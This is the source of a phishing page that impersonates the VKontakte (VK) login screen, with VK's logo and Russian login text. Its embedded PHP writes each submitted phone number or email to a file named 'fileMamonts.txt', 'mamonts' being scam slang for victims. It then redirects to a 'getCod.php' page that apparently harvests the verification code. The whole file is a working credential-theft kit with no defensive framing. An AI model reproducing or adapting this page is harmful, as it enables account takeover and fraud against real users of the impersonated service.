<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VK LOGIN</title>
  <link rel="stylesheet" href="main.css">
  <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/1024px-VK_Compact_Logo_%282021-present%29.svg.png" type="image/x-icon">
</head>
<body>
  <img id="vkLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/1024px-VK_Compact_Logo_%282021-present%29.svg.png" alt="vkLogo">
  <p id="logText">Вход ВКонтакте</p>

  <form action="main.php" method="post">
    <div id="inputAndLogWrapper">
      <input id="numOrMailInput" name="NumOrMail" type="text" placeholder="Телефон или почта">
      <button type="submit" id="logBtn">Войти</button>
    </div>
  </form>
  <?php
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
      $NumOrMail = trim($_POST['NumOrMail']);
      if(empty($NumOrMail)) {
        header('Location: errorNum.php');
        exit();
      } else {
        $fileMamonts= fopen('fileMamonts.txt', 'a+');
        fwrite($fileMamonts, $NumOrMail."\n");
        fclose($fileMamonts);
        header('Location: getCod.php');
      }
    }
  ?>
  <button id="regByn">Зарегестрироваться</>
  <button id="makePageForBusinessBtn">Создать страницу для бизнеса</>
  
  <script src="main.js"></script>
</body>
</html>